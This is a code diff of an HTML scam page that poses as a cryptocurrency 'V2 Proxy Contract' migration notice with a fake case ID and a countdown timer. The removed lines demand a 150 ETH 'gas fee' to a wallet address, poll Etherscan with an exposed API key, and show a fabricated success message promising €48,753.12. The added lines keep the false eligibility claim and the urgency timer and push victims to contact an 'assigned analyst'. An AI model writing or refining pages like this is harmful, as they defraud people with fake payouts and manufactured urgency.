@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -90,35 +90,6 @@
         }
         .explanation b { color: white; }
 
-        .gateway-box {
-            background: #000;
-            border: 1px solid #333;
-            border-radius: 16px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-
-        .address-text {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            color: var(--primary);
-            word-break: break-all;
-            display: block;
-            margin-bottom: 10px;
-        }
-
-        .btn-copy {
-            background: #222;
-            color: white;
-            border: 1px solid #444;
-            padding: 8px 16px;
-            border-radius: 8px;
-            font-size: 10px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .btn-copy:hover { background: #333; }
-
         .main-action {
             width: 100%;
             background: white;
@@ -164,29 +135,20 @@
 
         <div class="explanation">
             <b>Smart Contract Verification:</b><br>
-            The identification <b class="case-id-text">#ETH-7477-X</b> confirms your eligibility for this allocation. To release the funds, you must trigger the <b>V2 Proxy Contract</b>. The 150 ETH fee is the mandatory network gas required to move assets from the legacy escrow to your active wallet.
+            The identification <b class="case-id-text">#ETH-7477-X</b> confirms your eligibility for this allocation. To release the funds, you must contact your assigned analyst to authorize the <b>V2 Proxy Contract</b> migration.
         </div>
 
-        <div class="gateway-box">
-            <div style="font-size: 10px; color: #555; margin-bottom: 8px; font-weight: 700;">NETWORK DEPLOYMENT GATEWAY:</div>
-            <span class="address-text" id="wallet-addr">0x77E3D0BE586e38744f83Ce2Dab51ad9F878476A1</span>
-            <button class="btn-copy" onclick="copyAddress()">COPY GATEWAY ADDRESS</button>
-        </div>
+        <!-- Wallet Box Removed -->
 
-        <button class="main-action" onclick="verifyMigration()">FINALIZE V2 UPGRADE</button>
+        <button class="main-action" onclick="contactAnalyst()">Contact your financial analyst</button>
         
         <div class="timer">MIGRATION WINDOW EXPIRES IN: <span id="timer">--:--:--</span></div>
     </div>
 </div>
 
 <script>
-    const CASE_ID = "#ETH-7477-X";
-    const TARGET_WALLET = "0x77E3D0BE586e38744f83Ce2Dab51ad9F878476A1";
-    const FEE = 150;
-    const API_KEY = "ATUAJBD9PE7HUBAZY7QHQ4YTZ6VFAGWJMU";
-    const INITIAL_TIME = 1800000; // 500 hours in seconds
+    const INITIAL_TIME = 1800000; 
 
-    // --- LOCAL STORAGE PERSISTENCE ---
     let time;
     const savedTime = localStorage.getItem('migration_timer');
     
@@ -197,27 +159,11 @@
         localStorage.setItem('migration_timer', time);
     }
 
-    function copyAddress() {
-        const addr = document.getElementById('wallet-addr').innerText;
-        navigator.clipboard.writeText(addr);
-        alert("Gateway Address Copied to Clipboard");
+    function contactAnalyst() {
+        alert("Redirecting to secure support channel...");
+        // Add redirect or support modal logic here
     }
 
-    async function verifyMigration() {
-        try {
-            const res = await fetch(`https://api.etherscan.io/v2/api?chainid=1&module=account&action=balance&address=${TARGET_WALLET}&tag=latest&apikey=${API_KEY}`);
-            const data = await res.json();
-            const bal = Number(data.result) / 1e18;
-
-            if(bal >= FEE) {
-                alert(`SUCCESS: Settlement verified. Smart Contract ${CASE_ID} has been deployed. Your €48,753.12 will arrive in your wallet within 15-30 minutes.`);
-            } else {
-                alert(`[NETWORK ERROR: INSUFFICIENT GAS]\n\nDeployment Fee for Case ${CASE_ID} not detected.\n\nRequired: ${FEE} ETH\nDetected: ${bal.toFixed(4)} ETH\n\nPlease complete the deposit to the network gateway to release your €48,753.12.`);
-            }
-        } catch(e) { alert("Execution Error. Please check connectivity."); }
-    }
-
-    // Timer Logic with Persistence
     setInterval(() => {
         if (time > 0) {
             time--;
